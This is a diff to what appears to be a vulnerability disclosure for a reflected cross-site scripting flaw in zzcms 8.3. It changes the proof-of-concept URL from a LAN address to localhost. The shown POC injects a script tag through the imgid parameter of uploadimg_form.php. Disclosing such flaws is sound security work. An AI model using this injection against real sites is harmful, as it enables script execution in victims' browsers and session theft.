@@ -10,7 +10,7 @@ Triggered after user or admin login
 ![](https://github.com/RobinParkerX/zzcms8.3-xss/blob/master/image/2.png)
 ## POC
 ```
-http://192.168.30.216/uploadimg_form.php?imgid="><script>alert(2)</script>"
+http://127.0.0.1/uploadimg_form.php?imgid="><script>alert(2)</script>"
 
 ```
 ![](https://github.com/RobinParkerX/zzcms8.3-xss/blob/master/image/3.png)
